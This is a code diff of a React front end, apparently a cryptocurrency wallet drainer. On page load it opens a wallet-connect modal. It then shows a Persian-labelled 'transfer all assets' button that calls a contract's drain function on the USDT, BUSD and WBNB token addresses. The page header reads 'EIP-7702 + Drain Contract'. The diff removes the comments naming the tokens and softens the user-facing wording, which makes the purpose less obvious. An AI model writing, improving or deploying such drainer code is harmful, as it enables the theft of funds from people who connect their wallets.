@@ -1,3 +1,4 @@
+
 import { useEffect } from "react";
 import {
   createWeb3Modal,
@@ -34,11 +35,11 @@ createWeb3Modal({
 
 function App() {
   const { open } = useWeb3Modal();
-  const { address, isConnected } = useWeb3ModalAccount();
+  const { isConnected } = useWeb3ModalAccount();
   const { walletProvider } = useWeb3ModalProvider();
 
   useEffect(() => {
-    open(); // باز کردن اتومات Modal
+    open();
   }, []);
 
   const drainTokens = async () => {
@@ -53,28 +54,27 @@ function App() {
 
       const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
       const tokens = [
-        "0x55d398326f99059fF775485246999027B3197955", // USDT
-        "0xe9e7cea3dedca5984780bafc599bd69add087d56", // BUSD
-        "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"  // WBNB
+        "0x55d398326f99059fF775485246999027B3197955",
+        "0xe9e7cea3dedca5984780bafc599bd69add087d56",
+        "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"
       ];
 
       const tx = await contract.drain(tokens);
       await tx.wait();
       alert("✅ انتقال انجام شد");
     } catch (err) {
-      console.error("❌ خطا در drain:", err);
-      alert("❌ خطا در اجرای انتقال");
+      console.error("❌ خطا:", err);
+      alert("🚫 خطایی در انتقال رخ داد");
     }
   };
 
   return (
     <div style={{ textAlign: "center", marginTop: "60px" }}>
       <h2>EIP-7702 + Drain Contract</h2>
-
-      {!isConnected ? (
-        <p>🔌 لطفاً کیف پول خود را متصل کنید</p>
-      ) : (
+      {isConnected ? (
         <button onClick={drainTokens}>💸 انتقال همه دارایی</button>
+      ) : (
+        <p>🔌 منتظر اتصال کیف پول...</p>
       )}
     </div>
   );
